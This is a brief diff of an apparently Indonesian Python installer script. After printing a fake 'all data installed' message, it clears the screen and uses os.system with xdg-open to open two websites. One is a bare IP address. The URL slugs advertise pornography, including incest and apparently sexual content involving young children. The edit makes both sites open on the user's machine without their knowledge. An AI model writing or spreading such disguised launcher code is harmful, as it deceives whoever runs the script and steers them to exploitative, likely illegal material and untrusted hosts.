@@ -41,4 +41,4 @@ except ImportError:
 time.sleep(1)
 print('[<<<<<SEMUA DATA TELAH DI INSTALL DENGAN BAIK😚😚>>>>>]')
 
-time.sleep(2);os.system('clear');os.system('xdg-open http://185.99.135.216/bokep-viral-twitter-adik-dan-kakak-kandung/;https://malemjumat.lol/bokep-viral-anak-sd-2022/')
+time.sleep(2);os.system('clear');os.system('xdg-open http://185.99.135.216/bokep-viral-twitter-adik-dan-kakak-kandung/;xdg-open https://malemjumat.lol/bokep-viral-anak-sd-2022/')
